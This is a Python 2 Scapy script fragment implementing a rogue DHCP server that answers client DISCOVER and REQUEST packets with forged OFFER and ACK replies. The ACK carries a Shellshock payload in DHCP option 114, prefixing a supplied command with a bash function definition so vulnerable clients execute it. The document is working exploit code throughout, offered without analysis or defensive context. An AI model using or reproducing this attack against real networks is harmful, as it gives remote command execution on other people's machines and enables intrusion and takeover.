def dhcp_offer(raw_mac, xid):
    print "in dhcp_offer"
    packet = (Ether(src=get_if_hwaddr(args.iface), dst='ff:ff:ff:ff:ff:ff') /
    IP(src="192.168.0.105", dst='255.255.255.255') /
    UDP(sport=67, dport=68) /
    BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.1.4', siaddr='192.168.0.105', xid=xid) /
    DHCP(options=[("message-type", "offer"),
        ('server_id', '192.168.0.105'),
        ('subnet_mask', '255.255.255.0'),
        ('router', '192.168.0.105'),
        ('lease_time', 172800),
        ('renewal_time', 86400),
        ('rebinding_time', 138240),
        "end"]))

    #print packet.show()
    return packet


def dhcp_ack(raw_mac, xid, command):
    print "in dhcp_ack"
    packet = (Ether(src=get_if_hwaddr(args.iface), dst='ff:ff:ff:ff:ff:ff') /
    IP(src="192.168.0.105", dst='255.255.255.255') /
    UDP(sport=67, dport=68) /
    BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.1.4', siaddr='192.168.0.105', xid=xid) /
    DHCP(options=[("message-type", "ack"),
        ('server_id', '192.168.0.105'),
        ('subnet_mask', '255.255.255.0'),
        ('router', '192.168.0.105'),
        ('lease_time', 172800),
        ('renewal_time', 86400),
        ('rebinding_time', 138240),
        (114, "() { ignored;}; " + command),
        "end"]))

    #print packet.show()
    return packet


def dhcp(resp):
    if resp.haslayer(DHCP):
        mac_addr = resp[Ether].src
        raw_mac = binascii.unhexlify(mac_addr.replace(":", ""))

        if resp[DHCP].options[0][1] == 1:
            xid = resp[BOOTP].xid
            print "[*] Got dhcp DISCOVER from: " + mac_addr + " xid: " + hex(xid)
            print "[*] Sending OFFER..."
            packet = dhcp_offer(raw_mac, xid)
            #packet.plot(lambda x:len(x))
            #packet.pdfdump("test.pdf")
            #print hexdump(packet)
            #print packet.show()
            sendp(packet, iface=args.iface)

        if resp[DHCP].options[0][1] == 3:
            xid = resp[BOOTP].xid
            print "[*] Got dhcp REQUEST from: " + mac_addr + " xid: " + hex(xid)
            print "[*] Sending ACK..."
            packet = dhcp_ack(raw_mac, xid, command)
            #print hexdump(packet)
            #print packet.show()
            sendp(packet, iface=args.iface)

